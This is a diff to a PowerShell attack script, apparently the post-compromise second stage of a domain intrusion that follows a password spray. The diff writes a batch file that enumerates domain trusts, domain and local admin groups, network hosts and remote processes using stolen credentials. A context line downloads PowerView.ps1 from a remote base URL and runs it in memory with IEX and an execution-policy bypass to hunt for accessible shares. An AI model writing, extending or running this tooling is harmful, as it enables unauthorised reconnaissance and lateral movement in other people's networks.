@@ -55,10 +55,29 @@ if (-not $pw) { W 'spray failed' } else {
 if ($pw) {
     # ------------------------------------------------------------ discovery and share enumeration
     $disc = Join-Path $work 'discovery.txt'
-    & cmd.exe /c "whoami >> `"$disc`" 2>&1"
-    & cmd.exe /c "nltest /domain_trusts /all_trusts >> `"$disc`" 2>&1"
-    & cmd.exe /c "net view /all /domain >> `"$disc`" 2>&1"
-    & cmd.exe /c "tasklist /s $target /u $user /p $pw >> `"$disc`" 2>&1"
+    $discCmd = Join-Path $work 'disc.cmd'
+    @"
+@echo off
+echo === whoami === >> "$disc"
+whoami >> "$disc" 2>&1
+echo === trusts === >> "$disc"
+nltest /domain_trusts /all_trusts >> "$disc" 2>&1
+echo === domain admins === >> "$disc"
+net group "domain admins" /dom >> "$disc" 2>&1
+echo === local admins === >> "$disc"
+net localgroup "administrator" >> "$disc" 2>&1
+echo === domain view === >> "$disc"
+net view /all /domain >> "$disc" 2>&1
+echo === hosts === >> "$disc"
+net view /all >> "$disc" 2>&1
+echo === target processes === >> "$disc"
+tasklist /s $target /u $user /p $pw >> "$disc" 2>&1
+echo === time === >> "$disc"
+time /t >> "$disc" 2>&1
+echo === reachability === >> "$disc"
+ping -n 2 $target >> "$disc" 2>&1
+"@ | Set-Content $discCmd -Encoding ASCII
+    & cmd.exe /c $discCmd
     W 'discovery written'
     & powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.Webclient).DownloadString('$base/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose" 2>&1 | Out-File (Join-Path $work 'sharefind.out') -Encoding ascii
     W 'share enumeration done'
@@ -121,3 +140,4 @@ if ($pw) {
 }
 
 W "=== stage2 end ==="
+
